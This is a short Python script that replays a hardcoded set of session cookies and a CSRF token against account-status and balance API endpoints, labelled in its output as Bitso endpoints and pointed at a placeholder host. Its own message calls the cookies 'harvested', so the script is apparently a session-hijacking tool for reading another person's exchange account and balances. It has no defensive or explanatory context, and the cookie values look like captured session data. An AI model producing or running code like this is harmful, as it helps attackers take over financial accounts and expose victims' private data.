import requests

COOKIES = {
    "bitso_cc": "1",
    "_hjSessionUser_2335223": "eyJpZCI6ImU2MzFlMWVlLWVjNjktNTQ2YS1iM2QyLWVhNDYzN2YwNjdjMCIsImNyZWF0ZWQiOjE3OTM0NzYzMTgyMjAsImV4aXN0aW5nIjp0cnVlfQ==",
    "_ga": "GA1.1.575290914.1793463390",
    "d_id": "1adf556bc330374a",
    "ISTIO_AUTH_SESSION_ID": "082e749710ab5df7",
    "_dd_s": "aid=gralzrbozv&logs=1&id=5e7225d2-f760-431a-abaf-f074d70805b2&created=1793482626665&expire=1793486704110",
    "csrf": "oO5i5JNdGnLNsjbx",
    "htjs_user_id": "11920930",
    "NEXT_LOCALE": "us",
    "random_cookie": "082e749710ab5df7"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-CSRF-Token": "oO5i5JNdGnLNsjbx",
    "Accept": "application/json, text/plain, */*"
}

endpoints = [
    "https://yourtarget.com/api/v3/account_status",
    "https://yourtarget.com/api/v3/combined_balance?use_preferred_currency=1&include_stocks=1&include_vault=1",
    "https://yourtarget.com/api/v3/balance"
]

print("[*] Probing Bitso endpoints using harvested session cookies...")
for url in endpoints:
    print(f"\n[+] GET {url}")
    res = requests.get(url, cookies=COOKIES, headers=HEADERS, timeout=10)
    print(f"    -> Status: {res.status_code}")
    print(f"    -> Response: {res.text[:400]}")
